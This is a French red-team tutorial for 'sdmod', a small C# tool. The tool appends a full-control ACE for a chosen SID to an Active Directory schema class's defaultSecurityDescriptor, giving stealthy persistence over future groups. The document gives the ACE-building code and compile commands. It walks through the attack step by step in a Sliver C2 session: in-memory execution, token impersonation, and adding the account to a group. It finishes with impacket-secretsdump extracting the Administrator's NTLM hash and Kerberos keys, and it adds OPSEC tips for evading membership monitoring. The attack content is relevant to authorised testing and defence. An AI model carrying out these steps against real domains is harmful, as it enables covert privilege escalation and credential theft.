# sdmod — Guide pratique de modification du descripteur de sécurité du schéma AD

**Langues**: [English](TUTORIAL.md) | [中文](TUTORIAL.zh-CN.md) | **Français**

> Pour le red team / le test d'intrusion autorisé : en empoisonnant le `defaultSecurityDescriptor` du schéma AD, accorder à un SID donné le contrôle total sur chaque objet de cette classe créé par la suite, sans rejoindre aucun groupe à haut risque.
>
> ⚠️ Ce guide et l'outil associé sont destinés **uniquement aux environnements de test autorisés** (laboratoires, plateformes, engagements avec autorisation écrite). Ne les utilisez pas sur des systèmes de production non autorisés. Tous les noms de domaine, comptes, mots de passe et SID des exemples sont des valeurs fictives.

---

## 1. Contexte et objectif

Après avoir obtenu un compte de domaine à faibles privilèges (p. ex. `redpen`), le chemin d'élévation habituel consiste à l'ajouter à des groupes à haut risque comme `Domain Admins`. Cela génère beaucoup de bruit de surveillance : les défenseurs surveillent de près les modifications de `Member` sur les groupes privilégiés (journal de sécurité Windows **Event ID 4728 / 4732**) et le remarqueront rapidement.

L'objectif de cette approche :

- **Ne modifier aucune appartenance de groupe**, en contournant la surveillance habituelle ;
- Modifier le `defaultSecurityDescriptor` d'une classe de la partition **Schema** d'AD — « empoisonner le modèle » ;
- Tout **objet de cette classe créé à l'avenir** (p. ex. un nouveau groupe) reçoit automatiquement une ACE de **contrôle total** (mêmes droits que Domain Admins) pour le SID donné (p. ex. le SID de `redpen`) lors de l'initialisation de sa liste de contrôle d'accès (ACL) ;
- Obtenir une persistance de privilèges durable, furtive et soutenable : `redpen` n'a jamais besoin de rejoindre un groupe privilégié, mais peut prendre le contrôle de tout groupe privilégié créé ultérieurement.

---

## 2. Pourquoi ne pas utiliser les outils existants

Nous avons d'abord essayé `sharpview`, `sharpsh`, `nps` et d'autres outils existants, mais en pratique (dans l'environnement de compilation Mono de l'époque), ils ont tous échoué pour diverses raisons :

- **Incompatibilité Mono vs API de sécurité native Windows** : les descripteurs de sécurité binaires produits par l'espace de noms `System.Security.AccessControl` sont rejetés par le DC, déclenchant systématiquement « serveur refusant le traitement » ;
- **Différences de validation de format SDDL / descripteur de sécurité** : même en appelant via P/Invoke les API natives de `advapi32.dll`, des différences de validation de format subsistent sur les descripteurs de sécurité de type DS de la partition de schéma ;
- **Localisation du rôle FSMO** : la modification d'un objet de schéma doit atteindre le DC détenant le rôle FSMO **Schema Master** ; l'auto-sélection aboutit très probablement sur un DC ordinaire et est refusée.

Plutôt que de patcher le code source de ces trois outils, **écrivons nous-mêmes un outil minimaliste**, spécifiquement pour ce scénario, tout en tenant compte de l'exigence d'exécution en mémoire sous Sliver C2.

---

## 3. Conception de l'outil : sdmod

### 3.1 Logique principale

`sdmod` est un programme console C# minimaliste qui se lie à un DC via LDAP, lit le descripteur de sécurité de l'objet cible sous forme de chaîne SDDL, ajoute une ACE de contrôle total pour le SID donné, puis réécrit la nouvelle chaîne SDDL dans l'attribut AD, en laissant le DC analyser et convertir nativement la modification.

**Arguments (5) :**

| Argument | Description |
|---|---|
| `<LDAP Path>` | Chemin de l'objet LDAP, p. ex. `LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,...` |
| `<User>` | Utilisateur d'authentification (`domaine\utilisateur`) |
| `<Pass>` | Mot de passe |
| `<AttrName>` | Attribut cible (p. ex. `defaultSecurityDescriptor`) |
| `<TrusteeSID>` | SID auquel accorder des droits |

**Code source** : voir [`sdmod.cs`](../sdmod.cs) à la racine du dépôt (la référence de compilation est uniquement `System.DirectoryServices`, aucune dépendance tierce). La logique principale tient en une ligne — ajouter l'ACE avec les mêmes droits que Domain Admins :

```csharp
string newAce = "(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;" + trusteeSid + ")";
string newSddl = originalSddl + newAce;
```

### 3.2 Compromis de conception clés (chaque compromis est issu de vraies difficultés)

| Compromis | Justification |
|---|---|
| **Chaîne SDDL brute plutôt que descripteur binaire** | Les opérations binaires standard de `CommonSecurityDescriptor` émettent des formats que le DC rejette sous Mono ; opérer directement sur la chaîne SDDL est analysé et converti nativement par le DC, identique à ce que font l'éditeur ADSI / `Set-ADObject` en interne, offrant la meilleure compatibilité de format. L'attribut renvoie lui-même le SDDL sous forme de chaîne, preuve que la forme texte est nativement prise en charge par AD. |
| **Ajouter une ACE plutôt que remplacer tout le SDDL** | Les descripteurs de la partition de schéma contiennent des ACE de type objet (OA), le propriétaire implicite et le groupe principal ; construire manuellement le descripteur complet est source d'erreurs. L'ajout ne fait qu'accorder des droits et préserve 100 % de la configuration par défaut, conformément au principe « impact minimal, traces minimales ». |
| **Uniquement `System.DirectoryServices`** | Évite délibérément les espaces de noms incompatibles avec Mono comme `System.Security.AccessControl`. Le coût est l'absence de vérification de types forte ; l'avantage est une compatibilité maximale : petite taille, aucune dépendance supplémentaire, stable entre versions, adapté à l'injection en mémoire sous Sliver. |
| **`ServerBind` explicite pour contourner l'auto-sélection** | Sans lui, le localisateur de DC natif Windows peut choisir un DC ordinaire ; lier explicitement le serveur nommé élimine à la racine la défaillance de localisation du rôle FSMO. |
| **Passer directement le SID, pas le nom du compte** | Les descripteurs de sécurité identifient les principaux par SID ; passer directement le SID évite la résolution nom→SID, moins d'appels API et moins de points de défaillance, ce qui correspond au flux red team (le SID est généralement déjà connu). |
| **Liaison `Secure`** | Active la signature/chiffrement LDAP pour éviter les informations d'identification en clair et satisfait la politique de sécurité par défaut du DC. |

### 3.3 SDDL en bref

L'attribut `defaultSecurityDescriptor` est stocké et renvoyé sous forme de chaîne **SDDL** — le Security Descriptor Definition Language, la syntaxe textuelle lisible par l'humain que Microsoft utilise pour les descripteurs de sécurité. Le DC analyse le SDDL nativement, donc écrire une chaîne SDDL est exactement équivalent à modifier le descripteur via l'éditeur ADSI ou `Set-ADObject` : aucune conversion binaire manuelle n'est jamais impliquée.

Prenons la valeur interrogée en 5.1 :

```text
D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

- `D:` — préfixe identifiant une **DACL** (Discretionary Access Control List) ; chaque bloc `(...)` est une **ACE** (Access Control Entry).
- Une ACE est un tuple de six champs séparés par des points-virgules : `(type;flags;rights;object_guid;inherit_object_guid;trustee)`.

**Codes de droits utilisés dans ce descripteur :**

| Code | Signification | Code | Signification |
|---|---|---|---|
| `RP` | Lire la propriété | `RC` | Lire le contrôle |
| `WP` | Écrire la propriété | `WD` | Écrire la DAC (changer les permissions) |
| `CR` | Créer un enfant | `SD` | Supprimer |
| `CC` | Créer tous les enfants | `DT` | Supprimer l'arborescence |
| `DC` | Supprimer un enfant | `SW` | Auto-écriture |
| `LC` | Lister les enfants | `LO` | Lister les objets |

Décodage des entrées de 5.1 (`A` = **Access Allowed**, c'est-à-dire une ACE d'autorisation ; les deux entrées `OA` sont des ACE de type objet — voir ci-dessous) :

| Entrée | Titulaire | Droits |
|---|---|---|
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)` | Domain Admins | contrôle total |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)` | SYSTEM | contrôle total |
| `(A;;RPLCLORC;;;AU)` | Utilisateurs authentifiés | lecture (RP + LC + LO + RC) |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)` | Account Operators | contrôle total |
| `(A;;RPLCLORC;;;PS)` | Print Operators | lecture |
| `(OA;;CR;ab721a55-...;;AU)` | Utilisateurs authentifiés | ACE d'objet — créer les enfants de la classe identifiée par le GUID |
| `(OA;;RP;46a9b11d-...;;S-1-5-32-560)` | Windows Authorization Access Group | ACE d'objet — lire une propriété spécifique identifiée par le GUID |

Le code combiné `RPWPCRCCDCLCLORCWOWDSDDTSW` couvre tous les droits d'objet du service d'annuaire — c'est-à-dire le contrôle total, les mêmes droits que Domain Admins. Les noms de titulaires (`DA`, `SY`, `AU`, `AO`, `PS`) sont des alias SDDL de SID connus — respectivement Domain Admins, SYSTEM, Utilisateurs authentifiés, Account Operators et Print Operators.

Les deux entrées `OA` sont des **ACE de type objet** : `OA` signifie **Object Access Allowed**. Contrairement à une simple ACE `A`, une ACE `OA` porte un GUID ObjectType supplémentaire et se limite aux objets ou propriétés de la classe identifiée par ce GUID (un schemaIDGUID) — la première entrée conditionne la création d'une classe d'enfants spécifique, la seconde limite la lecture d'une propriété spécifique. C'est une particularité de la partition de schéma qu'une simple ACE d'autorisation ne peut pas exprimer.

**Ce que l'outil ajoute** — une ACE d'autorisation accordant au SID titulaire les mêmes droits de contrôle total que Domain Admins :

```text
(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

Type `A` (Access Allowed), drapeaux et GUID vides, chaîne de droits de contrôle total et SID cible. Parce qu'elle est ajoutée — jamais en remplacement — chaque entrée existante (y compris les deux ACE `OA`, le propriétaire implicite et le groupe principal) est préservée.

---

## 4. Compilation

Environnement : Kali / Mono (`Mono C# compiler version 6.14.1.0`)

```bash
# Récupérer le fichier source (fichier unique)
curl -O https://raw.githubusercontent.com/RedteamNotes/sdmod/main/sdmod.cs

# Installer les dépendances de compilation (Debian / Kali)
sudo apt update
sudo apt install -y mono-mcs mono-devel

# Version minimale utilisable
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll

# Recommandée (forcer x64 + pas de fichier de symboles)
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll -platform:x64 -debug-
```

**Notes sur les options :**

| Option | Effet |
|---|---|
| `-platform:x64` | Force la cible x64 pour correspondre à l'architecture du beacon Sliver, évitant toute incompatibilité d'architecture lors de l'injection en mémoire |
| `-debug-` | Évite le fichier de symboles .mdb |

La compilation de base suffit ; la sortie fait environ 4-6 Ko. `-optimize` et les options similaires n'apportent qu'un bénéfice négligeable sur un programme aussi petit, et `-nologo` supprime simplement la bannière du compilateur sans effet sur la sortie — n'empilez pas les options pour la « discrétion » ; les seuls gains réels sont `-platform:x64` et `-debug-`.

---

## 5. Procédure pas à pas

> Environnement : domaine `redteamnotes.local`, DC `dc.redteamnotes.local`, compte à faibles privilèges `redpen`. Toutes les opérations s'exécutent dans une session de beacon Sliver (`hairpin-turn`).

### 5.1 Interroger la valeur d'origine (à enregistrer pour restauration)

Avant de modifier, interrogez la valeur actuelle et enregistrez le SDDL d'origine :

```text
sliver > sa-ldapsearch -- -query "(name=Group)" -dn "CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes defaultSecurityDescriptor
```

Sortie (valeur d'origine) :

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

### 5.2 Exécuter la modification

```text
sliver > execute-assembly --in-process sdmod.exe -- "LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" "redteamnotes\redpen" "P@ssw0rd" "defaultSecurityDescriptor" "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx"
```

Sortie : `[+] Success: ACE added successfully`

> ⚠️ Le mot de passe `P@ssw0rd` apparaît en clair dans les arguments `execute-assembly` (visibles dans les listes de processus). C'est une exposition inhérente à ce flux : acceptez-la, ou utilisez un contexte détenant déjà les informations d'identification.

### 5.3 Vérifier (comparer avec l'original)

Relancez la requête de 5.1 — une nouvelle ACE est désormais ajoutée à la fin :

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

### 5.4 Attendre la prise d'effet

**Point clé : attendez environ 3 à 5 minutes après l'écriture pour que la modification prenne effet ; 1 à 2 minutes ne suffisent pas.** Si vous n'attendez pas assez longtemps, l'ajout au groupe échoue (p. ex. `Unable to add user to group 5` / `Adding user to group failed: 560`).

### 5.5 Usurper l'identité cible (make-token)

Usurpez `redpen` sur le thread du beacon afin que les opérations réseau suivantes utilisent les informations d'identification de `redpen` :

```text
sliver > make-token -d redteamnotes.local -u redpen -p 'P@ssw0rd'
```

> Remarque : le `make-token` de Sliver utilise par défaut `LOGON32_LOGON_NEW_CREDENTIALS` — les actions locales s'exécutent toujours avec l'identité du processus d'origine ; seules les connexions réseau sortantes portent les nouvelles informations d'identification. Vous pouvez le changer avec `--logon-type`.

### 5.6 Ajout au groupe (BOF à haute OPSEC)

Utilisez le BOF `remote-addusertogroup` pour ajouter `redpen` au groupe cible :

```text
sliver > remote-addusertogroup -- --username redpen --server dc.redteamnotes.local --domain redteamnotes.local --groupname new_admingroup
```

- **Si la modification n'a pas encore pris effet** : erreur `Unable to add user to group 5 ... Adding user to group failed: 560` ;
- **Après avoir attendu 3-5 minutes** : sortie `SUCCESS.`

### 5.7 Vérifier l'appartenance

```text
sliver > sa-ldapsearch -- -query "(sAMAccountName=redpen)" -dn "DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes "sAMAccountName,cn,servicePrincipalName,memberOf"
```

Sortie — `memberOf` inclut désormais le groupe cible :

```text
memberOf: CN=new_admingroup,CN=Users,DC=redteamnotes,DC=local, CN=webadmins,DC=redteamnotes,DC=local, CN=Schema Admins,CN=Users,DC=redteamnotes,DC=local
```

### 5.8 Extraire immédiatement (vérifier et exploiter)

**Une fois l'appartenance en place, la permission du groupe peut retomber en quelques minutes — c'est un compte à rebours.** Préparez la commande d'extraction à l'avance et lancez-la juste après l'ajout réussi :

```bash
impacket-secretsdump redteamnotes.local/redpen:'P@ssw0rd'@dc.redteamnotes.local -just-dc-user administrator
```

Une extraction réussie prouve la chaîne de privilèges (vous obtenez le hash NTLM et les clés Kerberos d'`Administrator`). En cas d'échec, vérifiez d'abord si le groupe a réellement été ajouté. Vous pouvez répéter les opérations ; pas de raison de paniquer.

---

## 6. Concepts : appartenance à un groupe vs descripteur de sécurité par défaut

Deux concepts faciles à confondre :

| Concept | Description |
|---|---|
| **Appartenance à un groupe (Member)** | « Qui est dans quel groupe. » La blue team surveille de près les modifications de `Member` sur les groupes privilégiés (Event ID 4728/4732) ; ajouter directement à `Domain Admins` est très bruyant et facile à repérer. |
| **defaultSecurityDescriptor** | Le « plan/modèle » défini dans le schéma AD, sous `CN=Schema`. Le modifier revient à utiliser `Set-ADObject` pour changer le modèle d'une classe. |

**Effet réel de l'empoisonnement du modèle :**

- Les groupes qui **existent déjà** dans le domaine : leurs permissions **ne changent pas** ;
- Tout groupe **créé après** la commande : lors de l'initialisation de son ACL, il lit le `defaultSecurityDescriptor` falsifié ;
- Parce que le descripteur code en dur le SID de `redpen` avec des droits élevés, **chaque futur nouveau groupe donne à `redpen` le contrôle total** (les mêmes droits que Domain Admins).

**D'où vient la furtivité :** aucune modification d'appartenance, contournement de la surveillance de routine. Si l'IT crée plus tard un groupe privilégié pour un métier critique, `redpen` peut modifier ses membres ou en prendre le contrôle via l'ACL sans jamais le rejoindre — une persistance durable et très furtive.

---

## 7. Notes d'OPSEC et précautions

1. **Aucune appartenance à un groupe à haut risque** : ne déclenche jamais la surveillance des modifications d'appartenance ;
2. **Fenêtre d'attente** : environ 3-5 minutes pour la prise d'effet ; trop tôt échoue ;
3. **Extraire vite** : après l'appartenance, la permission du groupe est un compte à rebours ; ayez la commande d'extraction prête ;
4. **Restauration** : enregistrez le SDDL d'origine avant toute modification (voir 5.1) ;
5. **Impact minimal** : stratégie d'ajout uniquement (append-only), ne casse pas la structure ACL existante ;
6. **Forme d'exécution** : privilégiez BOF / `execute-assembly --in-process` pour éviter tout artefact disque ; si vous transformez en BOF, préférez une fine surcouche sur les primitives LDAP BOF existantes plutôt que de réécrire la couche C LDAP ;
7. **Ré-exécution** : relancer avec le même SID ajoute à nouveau la même ACE (pas d'idempotence) ; restaurez le SDDL d'origine enregistré (5.1) si nécessaire.

---

## 8. Nommage et maintenance

- **Nom** : `sdmod` (SD = Security Descriptor, mod = modify ; un nom court à retenir, le README porte la rigueur)
- **Dépôt** : `github.com/RedteamNotes/sdmod` (public)
- **Compatibilité** : se compile avec .NET Framework / Mono ; si transformé en BOF, préférez une fine surcouche sur les primitives LDAP BOF existantes.

---

*Les noms de domaine, comptes, mots de passe et SID des exemples sont fictifs ; ce document est destiné aux tests autorisés et à la recherche en sécurité uniquement.*
